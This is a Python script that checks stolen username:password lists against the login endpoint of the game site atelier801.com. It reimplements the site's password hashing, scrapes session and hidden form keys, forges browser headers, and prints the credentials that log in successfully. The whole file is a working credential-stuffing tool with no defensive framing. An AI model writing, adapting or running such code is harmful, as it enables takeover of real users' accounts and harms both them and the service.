import requests
import binascii
import hashlib
import base64
import json
import re

req = requests.session()
a = open("accs.txt","r")
stop = "default"

def hashPass(toHash):
    # Reqs
    CRYPT_VALUES = [-9, 25, -92, -37, -117, 18, 112, -95, -5, -108, 40, -83, -107, 73, -92, -102, 46, -52, 49, -118, -79, -56, -72, 63, -69, -98, -118, -22, 46, -16, -22, -111]
    HEX_CHARS = "0123456789abcdef"

    # SHA256 Hash
    toHash_sha256 = hashlib.sha256(toHash).hexdigest()

    ShaKikooBytes = []
    
    # 1 | Str to Chars
    for char in toHash_sha256:
        ShaKikooBytes.append(ord(char))

    # 2 | Byte to Arrays
    for indice in range(0, len(CRYPT_VALUES)):
        ShaKikooBytes.append(int(CRYPT_VALUES[indice] + indice))
    
    # 3 | Byte Arrays
    ShaKikooHex = ""
    for byte in ShaKikooBytes:
        firstId = (byte >> 4) & 15
        secondId = byte & 15
        ShaKikooHex = ShaKikooHex + HEX_CHARS[firstId] + HEX_CHARS[secondId]

    # 4 | Transformations
    ShaKikooHex_bin = binascii.unhexlify(ShaKikooHex) # Hexadecimal
    ShaKikooHex_sha256_bin = hashlib.sha256(ShaKikooHex_bin).digest() # Binary
    ShaKikooHex_sha256_b64 = base64.b64encode(ShaKikooHex_sha256_bin) # SHA256 Binary

    return ShaKikooHex_sha256_b64

CurrentId = "NaN"

def getKeys():
    #Get Heads, Locals
    body = req.get("https://atelier801.com/")
    #Regex for Secret Keys
    regex = r'<input type="hidden" name="(.+?)" value="(.+?)">'
    #Easily get JSession key
    sessionId = req.cookies['JSESSIONID']
    #Get secret keys with regex
    secretKeys = re.search(regex, body.text)
    #Return it to main method
    return secretKeys, sessionId;
    
file = [s.rstrip()for s in a.readlines()]
for lines in file:
    combo = lines.split(":")
    keys, jsonid = getKeys()
    param={
        "rester_connecte" : "on",
        "id":combo[0],
        "pass":(hashPass(combo[1].encode())).decode('utf-8'),
        "redirect":"https://atelier801.com/index",
        keys.group(1):keys.group(2)
    }
    Cookies = f'cb-enabled=accepted; G_ENABLED_IDPS=google; langue_principale=en; token_date=1591303160810; rester_connecte=""; login="{combo[0]}"; token=""; JSESSIONID="{jsonid}";Path=/'
    print(f"{jsonid} | {keys.group(1)} | {keys.group(2)}")
    headerData={
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language":"tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Cookie": Cookies,
        "Host" : "atelier801.com",
        "Origin": "https://atelier801.com",
        "Referer": "https://atelier801.com/login?redirect=https%3A%2F%2Fatelier801.com%2Findex",
        "Sec-Fetch-Des" : "empty",
        "Sec-Fetch-Mode" : "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent":"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest"
    }
    try:
        source = req.post("https://atelier801.com/identification", data=param, headers=headerData)
        print(source.text)
        #Hit
        if """supprime""" in source.text: 
            print(f"[+] Valid acc! {combo[0]}|{combo[1]}")
        #Broken Key / JSessionid
        elif """INACTIF""" in source.text:
            print("[!] Timed out!")
        #Broken Header
        elif """INTERDIT""" in source.text:
            print("[!] Something is not good! Change Header or Params")
        #It is working but it is not a Hit
        elif """ECHEC_AUTHENTIFICATION""":
            print(f"[-] Invalid acc! {combo[0]}|{combo[1]}")
        #Something is wrong
        else:
            print("[!] Something is not good! Change Header or Params")
    except:
        break
    if stop in combo[0]:
        break